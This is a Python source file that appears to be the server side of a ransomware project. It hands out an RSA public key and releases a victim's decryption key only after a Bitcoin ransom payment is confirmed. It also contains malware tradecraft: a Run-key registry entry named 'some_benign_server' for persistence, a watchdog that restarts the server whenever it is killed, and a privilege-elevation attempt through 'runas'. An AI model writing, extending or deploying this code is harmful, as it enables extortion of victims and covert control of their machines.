from fastapi import FastAPI, Request
import backend_crypto
import backend_bitcoin
import uvicorn
import multiprocessing
import psutil
import os
import ctypes
import winreg as reg   
from sqlalchemy import create_engine
import pandas
import sys
app = FastAPI()

# backend_crypto.generate_keys()
backend_crypto.read_keys()

@app.post("/{transation_id}")
async def decript_fernet_key(request: Request):
    fail_message = {'failed': 'You have to pay first! Wait till transaction confirmed!'}

    try:
        is_paid = await backend_bitcoin.was_payment_made(request.path_params['transation_id'])
        if not is_paid:
            return {'failed': 'You have to pay first! Wait till transaction confirmed!'}

        key: bytes = await request.body()
        return backend_crypto.decript_fernet_key(key)

    except Exception:
        return fail_message


@app.get("/getPublicKey")
async def get_public_key():
    
    try:
        public_file = open("public.pem","r")
        public_key = public_file.readlines()[0]
        public_file.close()
        return public_key
    except Exception as e:
        print(e)
        return {'failed':'server_problem'}


def watchdog(selected_pid):
    import time
    

    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "server_watchdog_pid", 1)
    print(f'server watchdog pid: {str(os.getpid())}')
    while True:
        time.sleep(5)
        #print(selected_pid)
        if not psutil.pid_exists(selected_pid):
            p = multiprocessing.Process(target=main, args=())
            p.start()
            selected_pid = p.pid
            print(f'server main pid: {selected_pid}')
    
def set_watchdog():
    pid_main = os.getpid()
    p = multiprocessing.Process(target=watchdog, args=(pid_main,))
    p.start()



def persistence():
    try:
        with open('start.bat','w') as f:
            f.write(f'chdir /d \"{str(os.getcwd())}\"\n')
            f.write(f'python \"{str(os.getcwd())}\main.py\"\nexit')
    except Exception as e:
        print(e)


    current_path = str(os.getcwd()) + '\\start.bat'       
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    with reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) as open_:
        reg.SetValueEx(open_,"some_benign_server",0,reg.REG_SZ,current_path)
        reg.CloseKey(open_)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def check_if_admin():
    if not is_admin():
        print(" ".join(sys.argv))
        params = " ".join(sys.argv)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
        sys.exit()

def main():
    #check_if_admin()
    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "server_main_pid", 1)
    uvicorn.run("main:app", port=443, host='127.0.0.1', reload = True)





if __name__ == "__main__":
    ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "server", 1)
    #uvicorn.run(app, host="127.0.0.1", port=8075)
    persistence()
    print(f'server main pid: {str(os.getpid())}')
    set_watchdog()
    main()

